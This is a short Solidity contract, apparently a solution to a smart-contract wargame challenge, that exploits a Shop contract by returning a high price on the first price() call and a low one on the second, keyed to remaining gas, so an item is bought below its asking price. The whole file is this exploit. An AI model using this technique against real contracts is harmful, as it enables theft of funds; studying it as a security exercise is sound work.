pragma solidity ^0.6.0;

interface Shop {
    function buy() external;
}

contract Buyer {
    function callBuy(address _contract) public {
        Shop(_contract).buy();
    }

    function price() external view returns (uint256) {
        if (gasleft() >= 25000) {
            return 110;
        } else {
            return 90;
        }
    }
}
